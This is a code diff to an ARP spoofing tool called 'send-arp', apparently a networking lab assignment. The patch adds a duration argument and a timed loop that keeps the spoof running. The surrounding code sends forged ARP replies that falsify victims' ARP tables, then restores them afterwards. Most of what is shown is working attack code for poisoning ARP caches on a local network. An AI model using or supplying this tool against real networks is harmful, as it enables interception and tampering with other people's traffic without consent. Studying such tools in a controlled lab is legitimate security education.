@@ -29,8 +29,8 @@ struct arp_packet {
 #pragma pack(pop)
 
 void usage() {
-    printf("syntax : send-arp <interface> <sender0 ip> <target0 ip> <sender1 ip> <target1 ip> ...\n");
-    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
+    printf("syntax : send-arp <interface> <sender0 ip> <target0 ip> <sender1 ip> <target1 ip> ... <duration time(s)>\n");
+    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2 10\n");
 }
 
 // ref:
@@ -114,7 +114,7 @@ int sendArpReply(pcap_t* handle, Mac sourceMac,
 }
 
 int main(int argc, char* argv[]) {    
-    if (4 > argc || 0 != argc%2) {
+    if (5 > argc || 0 != (argc-1)%2) {
         usage();
         return -1;
     }
@@ -131,17 +131,20 @@ int main(int argc, char* argv[]) {
     Ip    myIp = getMyIpv4Address(dev);
 
     map<Ip, Mac> macMap;
-    Ip senderIp[(argc-2)/2];
-    Ip targetIp[(argc-2)/2];
+    Ip senderIp[(argc-3)/2];
+    Ip targetIp[(argc-3)/2];
 
-    for (int i=0 ; i < (argc-2)/2 ; i++) {
+    for (int i=0 ; i < (argc-3)/2 ; i++) {
         senderIp[i] = Ip(argv[2+i*2]);
         targetIp[i] = Ip(argv[3+i*2]);
     }
 
+    int durationTime = atoi(argv[argc-1]);
+    time_t startTime;
+
     int res;
 
-    for (int i=0 ; i < (argc-2)/2 ; i++) {
+    for (int i=0 ; i < (argc-3)/2 ; i++) {
         if (macMap.end() == macMap.find(senderIp[i])) {
             res = sendArpRequest(handle, myMac, myIp, senderIp[i]);
 
@@ -226,7 +229,7 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    for (int i=0 ; i < (argc-2)/2 ; i++) {
+    for (int i=0 ; i < (argc-3)/2 ; i++) {
         if (macMap.end() != macMap.find(senderIp[i])) {
             res = sendArpReply(handle, myMac, targetIp[i], macMap.find(senderIp[i])->second, senderIp[i]);
             printf("INFO: %d.%d.%d.%d's arp table has been falsified\n", senderIp[i]>>24&0xFF, senderIp[i]>>16&0xFF, senderIp[i]>>8&0xFF, senderIp[i]>>0&0xFF);
@@ -242,7 +245,13 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    for (int i=0 ; i < (argc-2)/2 ; i++) {
+    startTime = time(NULL);
+
+    while (time(NULL)-startTime < durationTime) {
+    	printf("spoofing...\n");
+    }
+
+    for (int i=0 ; i < (argc-3)/2 ; i++) {
         if (macMap.end() != macMap.find(senderIp[i])) {
             for (int j=0 ; j<3 ; j++) {
                 res = sendArpRequest(handle, macMap.find(senderIp[i])->second, senderIp[i], targetIp[i]);
